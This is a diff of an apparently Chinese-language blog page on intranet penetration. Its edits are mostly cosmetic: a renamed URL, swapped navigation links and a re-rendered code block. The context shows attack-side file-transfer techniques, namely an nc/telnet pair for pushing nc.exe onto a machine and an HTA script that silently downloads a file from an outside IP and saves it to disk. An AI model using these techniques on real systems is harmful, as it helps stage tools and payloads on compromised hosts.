@@ -18,7 +18,7 @@
         
     </title>
 
-    <link rel="canonical" href="http://rootclay.github.io/2017/05/10/内网/">
+    <link rel="canonical" href="http://rootclay.github.io/2017/05/10/Lemon_Intranet/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -140,14 +140,14 @@
 
                         
                         <li>
-                            <a href="/about/">About</a>
+                            <a href="/archive/">Archives</a>
                         </li>
                         
                     
 
                         
                         <li>
-                            <a href="/archive/">Archives</a>
+                            <a href="/about/">About</a>
                         </li>
                         
                     
@@ -599,7 +599,7 @@ win03测试没有,win08有</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">服务端：nc -lvp 23 &lt; nc.exe</div><div class="line">下载端：telnet ip -f c:\nc.exe</div></pre></td></tr></table></figure>
 <p>6、hta<br>
 保存为.hta文件后运行</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="keyword">var</span> <span class="built_in">Object</span> = <span class="keyword">new</span> ActiveXObject(<span class="string">"MSXML2.XMLHTTP"</span>);</div><div class="line"><span class="built_in">Object</span>.open(<span class="string">"GET"</span>,<span class="string">"http://192.168.206.101/demo.php.zip"</span>,<span class="literal">false</span>);</div><div class="line"><span class="built_in">Object</span>.send();</div><div class="line"><span class="keyword">if</span> (<span class="built_in">Object</span>.Status == <span class="number">200</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">var</span> Stream = <span class="keyword">new</span> ActiveXObject(<span class="string">"ADODB.Stream"</span>);</div><div class="line">    Stream.Open();</div><div class="line">    Stream.Type = <span class="number">1</span>;</div><div class="line">    Stream.Write(<span class="built_in">Object</span>.ResponseBody);</div><div class="line">    Stream.SaveToFile(<span class="string">"C:\\demo.zip"</span>, <span class="number">2</span>);</div><div class="line">    Stream.Close();</div><div class="line">&#125;</div><div class="line"><span class="built_in">window</span>.close();</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span> <span class="attr">ID</span>=<span class="string">"test"</span></span></div><div class="line"><span class="attr">WINDOWSTATE</span> = <span class="string">"minimize"</span>&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">var Object = new ActiveXObject("MSXML2.XMLHTTP");</div><div class="line">Object.open("GET","http://192.168.206.101/demo.php.zip",false);</div><div class="line">Object.send();</div><div class="line">if (Object.Status == 200)</div><div class="line">&#123;</div><div class="line">    var Stream = new ActiveXObject("ADODB.Stream");</div><div class="line">    Stream.Open();</div><div class="line">    Stream.Type = 1;</div><div class="line">    Stream.Write(Object.ResponseBody);</div><div class="line">    Stream.SaveToFile("C:\\demo.zip", 2);</div><div class="line">    Stream.Close();</div><div class="line">&#125;</div><div class="line">window.close();</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span> <span class="attr">ID</span>=<span class="string">"test"</span></span></div><div class="line"><span class="attr">WINDOWSTATE</span> = <span class="string">"minimize"</span>&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
 <h3 id="linux下文件传输">linux下文件传输</h3>
 <p>1、perl脚本文件下载<br>
 kali下测试成功，centos5.5下，由于没有LWP::Simple这个，导致下载失败</p>
@@ -975,8 +975,8 @@ wmi只是创建进程,没办法去判断一个进程是否执行完成(比如pin
 <script type="text/javascript">
     /* * * CONFIGURATION VARIABLES * * */
     var disqus_shortname = "your-disqus-ID";
-    var disqus_identifier = "http://rootclay.github.io/2017/05/10/内网/";
-    var disqus_url = "http://rootclay.github.io/2017/05/10/内网/";
+    var disqus_identifier = "http://rootclay.github.io/2017/05/10/Lemon_Intranet/";
+    var disqus_url = "http://rootclay.github.io/2017/05/10/Lemon_Intranet/";
 
     (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
